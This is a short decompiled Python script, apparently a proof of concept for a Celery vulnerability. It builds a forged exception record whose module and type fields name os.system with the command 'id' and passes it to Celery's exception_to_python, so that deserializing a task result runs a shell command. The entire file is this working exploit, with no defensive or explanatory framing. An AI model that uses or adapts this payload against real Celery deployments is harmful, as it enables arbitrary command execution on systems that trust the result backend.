# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 317_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 606 bytes
from celery import Celery
app = Celery("tasks", broker="pyamqp://guest@localhost//")

@app.task
def example_task():
    return "This is a task."


malicious_data = {
 'result': '"malicious_command"', 
 'exc_module': '"os"', 
 'exc_type': '"system"', 
 'exc_message': '"id"'}
result = app.backend.exception_to_python(malicious_data)
print(result)

# okay decompiling 317_1.pyc
